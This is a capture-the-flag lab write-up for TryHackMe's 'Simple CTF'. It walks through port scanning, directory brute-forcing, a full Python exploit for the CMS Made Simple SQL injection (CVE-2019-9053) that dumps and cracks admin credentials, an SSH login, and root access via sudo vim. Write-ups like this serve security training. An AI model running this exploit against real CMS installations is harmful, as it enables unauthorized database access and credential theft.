# Simple CTF

### Difficulty = Easy

Running Our Nmap scan, gives us this:

```bash
sec-fortress@Pwn-F0rk-3X3C:~/THM/EasyCTF$ nmap --open 10.10.70.184    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 19:19 EDT
Nmap scan report for 10.10.70.184
Host is up (0.19s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1                                                                             
Nmap done: 1 IP address (1 host up) scanned in 24.13 seconds       

sec-fortress@Pwn-F0rk-3X3C:~/THM/EasyCTF$ nmap -p21,80,2222 -sCV 10.10.70.184
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 19:24 EDT
Nmap scan report for 10.10.70.184         
Host is up (0.25s latency).
PORT     STATE SERVICE VERSION        
21/tcp   open  ftp     vsftpd 3.0.3                  
| ftp-syst:                             
|   STAT:            
| FTP server status:                               
|      Connected to ::ffff:10.8.114.234     
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT    
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.33 seconds
```
### Enumeration 

Pasting **vsftpd 3.0.3 (exploit)** gives us a denial of service vulnerability, Not what we are looking for 🥴

![](https://i.imgur.com/LwdC8lm.png)

Navigating to port 80, gives us a default Apache2 page 

![](https://i.imgur.com/bLshJwx.png)

Checking **robots.txt** gives us two disallowed entries, Navigating to the website path `/openemr-5_0_1_3` give us a 404

![](https://i.imgur.com/SsAJSSn.png)

Directory bruteforce gave us few directories 

```sh
sec-fortress@Pwn-F0rk-3X3C:~/THM/EasyCTF$ gobuster dir -u http://10.10.81.245/ -w ~/SecLists-master/Discovery/Web-Content/big.txt -b 401,400,400,501,402,404,403 -x bak,zip,php,PHP,txt,html 
-t 40 2>/dev/null
===============================================================
Gobuster v3.5                                                                                 
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.245/
[+] Method:                  GET                                                              
[+] Threads:                 40                                                               
[+] Wordlist:                /home/sec-fortress/SecLists-master/Discovery/Web-Content/big.txt
[+] Negative Status codes:   501,402,404,403,401,400                                          
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,bak,zip,php,PHP,txt
[+] Timeout:                 10s
===============================================================
2023/08/10 01:22:51 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]                                               
/robots.txt           (Status: 200) [Size: 929]
/simple               (Status: 301) [Size: 313] [--> http://10.10.81.245/simple/]                                                                                                         
===============================================================
2023/08/10 01:39:31 Finished                                                                  
===============================================================
```

But the juicy one here is /simple, Navigating to /simple we have this page :

![](https://i.imgur.com/c8RKbpX.png)

After much enumeration, i noticed that the CMS version 2.2.8 was vulnerable to **Unauthenticated SQL Injection** [CVE-2019-9053]

![](https://i.imgur.com/EtLYiNV.png)

- Found an exploit from Exploit-DB, But it doesn't work, so you can use this:

```sh
#!/usr/bin/python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053
# Updated by Krishna Upadhyay for Python 3

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist, encoding='utf-8', errors='ignore')
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5((salt + line).encode('utf-8')).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password"))
    crack_password()

beautify_print()
```

- Running it gave us a password with the user **mitch**:

![](https://i.imgur.com/0EyF45B.png)

- these password is encoded in MD5, so we cracked it and got the real password

![](https://i.imgur.com/Y73vcY3.png)

**Booyah!! 😘, Now we have a password and username, let login through SSH with mitch:secret**

---

![](https://i.imgur.com/k2mzoJc.png)

We specified `-p 2222` because ssh won't allow us login on default port 22, Remember our nmap scan 🤔!
### Privilege Escalation

- checking /etc/issue and enumerating on the system gives us a privilege escalation exploit

![](https://i.imgur.com/bX7ynU1.png)

- You can download the exploit from here: https://www.exploit-db.com/exploits/44298
- Now compile it into the system

![](https://i.imgur.com/47MCfBV.png)

- As we can see it looks like the exploit doesn't work, so let enumerate harder 🌚

![](https://i.imgur.com/yBo2dXC.png)

- Right here we can see that `sudo` is given SUID permissions, so we don't need to be root to run it.
- doing `sudo -l` tells use we can run `vim` as root, great 🤟!!
- Navigating to https://gtfobins.github.io/ gives us a way to get root, using `vim`

![](https://i.imgur.com/i8fdgGl.png)

- we will be using option(b), also make sure to change `py` to `py3`

![](https://i.imgur.com/wOoYo3g.png)

Bankaiii, R00t3d ☢️🥳

